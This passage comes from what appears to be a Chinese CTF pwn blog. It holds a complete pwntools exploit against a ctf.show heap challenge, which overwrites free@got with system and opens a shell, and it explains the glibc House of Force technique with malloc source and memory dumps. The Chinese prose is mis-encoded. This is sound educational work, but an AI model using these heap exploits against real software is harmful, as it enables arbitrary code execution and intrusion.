class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getflag</span>() :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;114514&#x27;</span>)  <br>add(<span class="hljs-number">0x10</span> , <span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span> , <span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#1</span><br>delete(<span class="hljs-number">1</span>) <span class="hljs-comment">#1</span><br>payload = <span class="hljs-number">0x18</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x000000000060208d</span>)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>add(<span class="hljs-number">0x60</span> , <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment">#1</span><br>payload1 = <span class="hljs-number">0x23</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>])<br>add(<span class="hljs-number">0x60</span> , payload1) <span class="hljs-comment">#2</span><br>payload2 = p64(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload2) , payload2)<br>delete(<span class="hljs-number">1</span>)<br>p.interactive()<br><br><br><br><br><br><br><br></code></pre></td></tr></table></figure><p>è¿™é¢˜ä¸€æ ·å¯ä»¥ç”¨Arbitrary Allocæ”»å‡»ï¼Œå…³äºfastbinæ”»å‡»ç­‰æˆ‘ç ”ç©¶é€å½»ä¼šè¿›è¡Œæ€»ç»“ï¼Œè¿™é‡Œå…ˆè´´ä¸ªè„šæœ¬ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./pwn144_1604&#x27;</span><br>url = <span class="hljs-string">&#x27;pwn.challenge.ctf.show 28271&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            b * main</span><br><span class="hljs-string">            b * 0x0000000000400B1A</span><br><span class="hljs-string">            b * 0x0000000000400C4A</span><br><span class="hljs-string">            b * 0x0000000000400D43</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br>            gdb.attach(p, gdbscript=gdbscript)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Content of heap:&#x27;</span> , content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Content of heap : &#x27;</span> , content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getflag</span>() :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;114514&#x27;</span>)  <br>add(<span class="hljs-number">0x10</span> , <span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span> , <span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#1</span><br>delete(<span class="hljs-number">1</span>) <span class="hljs-comment">#1</span><br>payload = <span class="hljs-number">0x18</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x000000000060208d</span>)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>add(<span class="hljs-number">0x60</span> , <span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#1</span><br>payload1 = <span class="hljs-number">0x3</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(<span class="hljs-number">0x1BF60</span>)<br>add(<span class="hljs-number">0x60</span> , payload1) <span class="hljs-comment">#2</span><br>getflag()<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å †</category>
      
    </categories>
    
    
    <tags>
      
      <tag>House of Spirit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>House of Forceæ”»å‡»</title>
    <link href="/2024/08/01/House-of-Force%E6%94%BB%E5%87%BB/"/>
    <url>/2024/08/01/House-of-Force%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>House Of Force æ˜¯ä¸€ç§å †åˆ©ç”¨æ–¹æ³•ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯è¯´ House Of Force å¿…é¡»å¾—åŸºäºå †æ¼æ´æ¥è¿›è¡Œåˆ©ç”¨ã€‚å¦‚æœä¸€ä¸ªå † (heap based) æ¼æ´æƒ³è¦é€šè¿‡ House Of Force æ–¹æ³•è¿›è¡Œåˆ©ç”¨ï¼Œéœ€è¦ä»¥ä¸‹æ¡ä»¶ï¼š</p><ol><li>èƒ½å¤Ÿä»¥æº¢å‡ºç­‰æ–¹å¼æ§åˆ¶åˆ° top chunk çš„ size åŸŸ</li><li>èƒ½å¤Ÿè‡ªç”±åœ°æ§åˆ¶å †åˆ†é…å°ºå¯¸çš„å¤§å°</li></ol><p>House Of Force äº§ç”Ÿçš„åŸå› åœ¨äº glibc å¯¹ top chunk çš„å¤„ç†ï¼Œæ ¹æ®å‰é¢å †æ•°æ®ç»“æ„éƒ¨åˆ†çš„çŸ¥è¯†æˆ‘ä»¬å¾—çŸ¥ï¼Œè¿›è¡Œå †åˆ†é…æ—¶ï¼Œå¦‚æœæ‰€æœ‰ç©ºé—²çš„å—éƒ½æ— æ³•æ»¡è¶³éœ€æ±‚ï¼Œé‚£ä¹ˆå°±ä¼šä» top chunk ä¸­åˆ†å‰²å‡ºç›¸åº”çš„å¤§å°ä½œä¸ºå †å—çš„ç©ºé—´ã€‚</p><p>é‚£ä¹ˆï¼Œå½“ä½¿ç”¨ top chunk åˆ†é…å †å—çš„ size å€¼æ˜¯ç”±ç”¨æˆ·æ§åˆ¶çš„ä»»æ„å€¼æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿç­”æ¡ˆæ˜¯ï¼Œå¯ä»¥ä½¿å¾— top chunk æŒ‡å‘æˆ‘ä»¬æœŸæœ›çš„ä»»ä½•ä½ç½®ï¼Œè¿™å°±ç›¸å½“äºä¸€æ¬¡ä»»æ„åœ°å€å†™ã€‚ç„¶è€Œåœ¨ glibc ä¸­ï¼Œä¼šå¯¹ç”¨æˆ·è¯·æ±‚çš„å¤§å°å’Œ top chunk ç°æœ‰çš„ size è¿›è¡ŒéªŒè¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// è·å–å½“å‰çš„top chunkï¼Œå¹¶è®¡ç®—å…¶å¯¹åº”çš„å¤§å°</span><br>victim = av-&gt;top;<br>size   = chunksize(victim);<br><span class="hljs-comment">// å¦‚æœåœ¨åˆ†å‰²ä¹‹åï¼Œå…¶å¤§å°ä»ç„¶æ»¡è¶³ chunk çš„æœ€å°å¤§å°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¿›è¡Œåˆ†å‰²ã€‚</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE)) <br>&#123;<br>    remainder_size = size - nb;<br>    remainder      = chunk_at_offset(victim, nb);<br>    av-&gt;top        = remainder;<br>    set_head(victim, nb | PREV_INUSE |<br>            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_head(remainder, remainder_size | PREV_INUSE);<br><br>    check_malloced_chunk(av, victim, nb);<br>    <span class="hljs-type">void</span> *p = chunk2mem(victim);<br>    alloc_perturb(p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶è€Œï¼Œå¦‚æœå¯ä»¥ç¯¡æ”¹ size ä¸ºä¸€ä¸ªå¾ˆå¤§å€¼ï¼Œå°±å¯ä»¥è½»æ¾çš„é€šè¿‡è¿™ä¸ªéªŒè¯ï¼Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢è¯´çš„éœ€è¦ä¸€ä¸ªèƒ½å¤Ÿæ§åˆ¶ top chunk size åŸŸçš„æ¼æ´ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE)<br></code></pre></td></tr></table></figure><p>ä¸€èˆ¬çš„åšæ³•æ˜¯æŠŠ top chunk çš„ size æ”¹ä¸º - 1ï¼Œå› ä¸ºåœ¨è¿›è¡Œæ¯”è¾ƒæ—¶ä¼šæŠŠ size è½¬æ¢æˆæ— ç¬¦å·æ•°ï¼Œå› æ­¤ -1 ä¹Ÿå°±æ˜¯è¯´ unsigned long ä¸­æœ€å¤§çš„æ•°ï¼Œæ‰€ä»¥æ— è®ºå¦‚ä½•éƒ½å¯ä»¥é€šè¿‡éªŒè¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">remainder      = chunk_at_offset(victim, nb);<br>av-&gt;top        = remainder;<br><br><span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</span><br></code></pre></td></tr></table></figure><p>ä¹‹åè¿™é‡Œä¼šæŠŠ top æŒ‡é’ˆæ›´æ–°ï¼Œæ¥ä¸‹æ¥çš„å †å—å°±ä¼šåˆ†é…åˆ°è¿™ä¸ªä½ç½®ï¼Œç”¨æˆ·åªè¦æ§åˆ¶äº†è¿™ä¸ªæŒ‡é’ˆå°±ç›¸å½“äºå®ç°ä»»æ„åœ°å€å†™ä»»æ„å€¼ (write-anything-anywhere)ã€‚</p><p><strong>ä¸æ­¤åŒæ—¶ï¼Œæˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œtopchunk çš„ size ä¹Ÿä¼šæ›´æ–°ï¼Œå…¶æ›´æ–°çš„æ–¹æ³•å¦‚ä¸‹</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">victim = av-&gt;top;<br>size   = chunksize(victim);<br>remainder_size = size - nb;<br>set_head(remainder, remainder_size | PREV_INUSE);<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦ä¸‹æ¬¡åœ¨æŒ‡å®šä½ç½®åˆ†é…å¤§å°ä¸º x çš„ chunkï¼Œæˆ‘ä»¬éœ€è¦ç¡®ä¿ remainder_size ä¸å°äº x+ MINSIZEã€‚</p><h2 id="ç®€å•ç¤ºä¾‹"><a href="#ç®€å•ç¤ºä¾‹" class="headerlink" title="ç®€å•ç¤ºä¾‹"></a>ç®€å•ç¤ºä¾‹</h2><p>åœ¨å­¦ä¹ å®Œ HOF çš„åŸç†ä¹‹åï¼Œæˆ‘ä»¬è¿™é‡Œé€šè¿‡ä¸€ä¸ªç¤ºä¾‹æ¥è¯´æ˜ HOF çš„åˆ©ç”¨ï¼Œè¿™ä¸ªä¾‹å­çš„ç›®æ ‡æ˜¯é€šè¿‡ HOF æ¥ç¯¡æ”¹ <code>malloc@got.plt</code> å®ç°åŠ«æŒç¨‹åºæµç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> *ptr,*ptr2;<br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr=(<span class="hljs-type">long</span> *)(((<span class="hljs-type">long</span>)ptr)+<span class="hljs-number">24</span>);<br>    *ptr=<span class="hljs-number">-1</span>;        <span class="hljs-comment">// &lt;=== è¿™é‡ŒæŠŠtop chunkçš„sizeåŸŸæ”¹ä¸º0xffffffffffffffff</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">-4120</span>);  <span class="hljs-comment">// &lt;=== å‡å°top chunkæŒ‡é’ˆ</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);   <span class="hljs-comment">// &lt;=== åˆ†é…å—å®ç°ä»»æ„åœ°å€å†™</span><br>&#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œæˆ‘ä»¬åˆ†é…ä¸€ä¸ª 0x10 å­—èŠ‚å¤§å°çš„å—</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span> &lt;=== ptr<br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x0000000000020fe1 &lt;=== top chunk<br><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>ä¹‹åæŠŠ top chunk çš„ size æ”¹ä¸º 0xffffffffffffffffï¼Œåœ¨çœŸæ­£çš„é¢˜ç›®ä¸­ï¼Œè¿™ä¸€æ­¥å¯ä»¥é€šè¿‡å †æº¢å‡ºç­‰æ¼æ´æ¥å®ç°ã€‚ å› ä¸º -1 åœ¨è¡¥ç ä¸­æ˜¯ä»¥ 0xffffffffffffffff è¡¨ç¤ºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥èµ‹å€¼ -1 å°±å¯ä»¥ã€‚</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span> &lt;=== ptr<br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>xffffffffffffffff &lt;=== top chunk sizeåŸŸè¢«æ›´æ”¹<br><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„æ­¤æ—¶çš„ top chunk ä½ç½®ï¼Œå½“æˆ‘ä»¬è¿›è¡Œä¸‹ä¸€æ¬¡åˆ†é…çš„æ—¶å€™å°±ä¼šæ›´æ”¹ top chunk çš„ä½ç½®åˆ°æˆ‘ä»¬æƒ³è¦çš„åœ°æ–¹</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7ffff7dd1b20</span> &lt;main_arena&gt;:    <span class="hljs-number">0</span>x0000000100000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000602020 &lt;=== top chunkæ­¤æ—¶ä¸€åˆ‡æ­£å¸¸<br><span class="hljs-attribute">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x00007ffff7dd1b78<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ‰§è¡Œ<code>malloc(-4120);</code>ï¼Œ-4120 æ˜¯æ€ä¹ˆå¾—å‡ºçš„å‘¢ï¼Ÿ é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æ˜ç¡®è¦å†™å…¥çš„ç›®çš„åœ°å€ï¼Œè¿™é‡Œæˆ‘ç¼–è¯‘ç¨‹åºåï¼Œ0x601020 æ˜¯ <code>malloc@got.plt</code> çš„åœ°å€</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x601020</span>:   <span class="hljs-number">0</span>x00007ffff<span class="hljs-number">7a91130</span> &lt;=== malloc@got.plt<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬åº”è¯¥å°† top chunk æŒ‡å‘ 0x601010 å¤„ï¼Œè¿™æ ·å½“ä¸‹æ¬¡å†åˆ†é… chunk æ—¶ï¼Œå°±å¯ä»¥åˆ†é…åˆ° <code>malloc@got.plt</code> å¤„çš„å†…å­˜äº†ã€‚</p><p>ä¹‹åæ˜ç¡®å½“å‰ top chunk çš„åœ°å€ï¼Œæ ¹æ®å‰é¢æè¿°ï¼Œtop chunk ä½äº 0x602020ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®¡ç®—åç§»å¦‚ä¸‹</p><p>0x601010-0x602020&#x3D;-4112</p><p>æ­¤å¤–ï¼Œç”¨æˆ·ç”³è¯·çš„å†…å­˜å¤§å°ï¼Œä¸€æ—¦è¿›å…¥ç”³è¯·å†…å­˜çš„å‡½æ•°ä¸­å°±å˜æˆäº†æ— ç¬¦å·æ•´æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__libc_malloc(<span class="hljs-type">size_t</span> bytes) &#123;<br></code></pre></td></tr></table></figure><p>å¦‚æœæƒ³è¦ç”¨æˆ·è¾“å…¥çš„å¤§å°ç»è¿‡å†…éƒ¨çš„ <code>checked_request2size</code>å¯ä»¥å¾—åˆ°è¿™æ ·çš„å¤§å°ï¼Œå³</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE_SZ (sizeof(size_t))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Check if a request is so large that it would wrap around zero when</span><br><span class="hljs-comment">   padded and aligned. To simplify some other code, the bound is made</span><br><span class="hljs-comment">   low enough so that adding MINSIZE will also not wrap around zero.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span><br><span class="hljs-meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span><br><span class="hljs-comment">/* pad request bytes into a usable size -- internal version */</span><br><span class="hljs-comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> request2size(req)                                                      \</span><br><span class="hljs-meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="hljs-meta">         ? MINSIZE                                                             \</span><br><span class="hljs-meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><br><span class="hljs-comment">/*  Same, except also perform argument check */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> checked_request2size(req, sz)                                          \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span><br><span class="hljs-meta">        __set_errno(ENOMEM);                                                   \</span><br><span class="hljs-meta">        return 0;                                                              \</span><br><span class="hljs-meta">    &#125;                                                                          \</span><br><span class="hljs-meta">    (sz) = request2size(req);</span><br></code></pre></td></tr></table></figure><p>ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡ REQUEST_OUT_OF_RANGE(req) è¿™ä¸ªæ£€æµ‹ï¼Œå³æˆ‘ä»¬ä¼ ç»™ malloc çš„å€¼åœ¨è´Ÿæ•°èŒƒå›´å†…ï¼Œä¸å¾—å¤§äº -2 * MINSIZEï¼Œè¿™ä¸ªä¸€èˆ¬æƒ…å†µä¸‹éƒ½æ˜¯å¯ä»¥æ»¡è¶³çš„ã€‚</p><ul><li>MALLOC_ALIGN_MASK : æ˜¯ç”¨äºå¯¹é½çš„æ©ç ã€‚<ul><li>32ä½ ï¼š0x07 </li><li>64ä½ ï¼š0x0F</li></ul></li><li>MALLOC_ALIGNMENT ï¼šæ˜¯å¯¹é½çš„å¤§å°<ul><li>32ä½ ï¼š8å­—èŠ‚</li><li>64ä½ 